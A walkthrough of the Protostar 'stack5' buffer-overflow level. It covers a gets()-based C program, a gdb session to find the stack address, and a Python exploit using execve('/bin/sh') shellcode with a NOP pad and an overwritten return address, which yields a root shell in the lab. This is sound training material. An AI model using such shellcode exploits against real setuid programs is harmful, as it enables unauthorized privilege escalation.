# Stack 5

Stack5 is a standard buffer overflow, this time introducing shellcode.

This level is at `/opt/protostar/bin/stack5`

Hints:
- At this point in time, it might be easier to use someone elses shellcode
- If debugging the shellcode, use `\xcc` (**int3**) to stop the program executing and return to the debugger
- remove the **int3**s once your shellcode is done.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

## Solution

Let's determine the address contained in the stack pointer (**ESP**):

```console
user@protostar:/opt/protostar/bin$ gdb -q ./stack5
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) disass main
Dump of assembler code for function main:
0x080483c4 <main+0>:	push   %ebp
0x080483c5 <main+1>:	mov    %esp,%ebp
0x080483c7 <main+3>:	and    $0xfffffff0,%esp
0x080483ca <main+6>:	sub    $0x50,%esp
0x080483cd <main+9>:	lea    0x10(%esp),%eax
0x080483d1 <main+13>:	mov    %eax,(%esp)
0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:	leave  
0x080483da <main+22>:	ret    
End of assembler dump.
(gdb) b *0x080483da
Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11.
(gdb) r
Starting program: /opt/protostar/bin/stack5 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x41414149
) at stack5/stack5.c:11
11	stack5/stack5.c: No such file or directory.
	in stack5/stack5.c
(gdb) si
Cannot access memory at address 0x41414145
(gdb) i r
eax            0xbffff660	-1073744288
ecx            0xbffff660	-1073744288
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff6b0	0xbffff6b0
ebp            0x41414141	0x41414141
esi            0x0	0
edi            0x0	0
eip            0xb7eadc00	0xb7eadc00 <__libc_start_main+112>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

Okay so this is `0xbffff6b0`. 

Our exploit with this [`shellcode`](http://shell-storm.org/shellcode/files/shellcode-827.php) will be:

```python
offset = 76
eip = '\xb0\xf6\xff\xbf'
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
nops = '\x90' * (offset-len(shellcode))
payload = shellcode + nops + eip

print(payload)
```

We need to use `cat` to maintain our shell:

```console
user@protostar:/opt/protostar/bin$ (python /tmp/exploit-5.py; cat) | ./stack5 
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

Or we can do it in a single line:

```console
user@protostar:/opt/protostar/bin$ (python -c "offset = 76; eip = '\xb0\xf6\xff\xbf'; shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'; nops = '\x90' * (offset-len(shellcode)); payload = shellcode + nops + eip; print(payload)"; cat) | ./stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)

```

## Useful links 

- <http://shell-storm.org/shellcode/>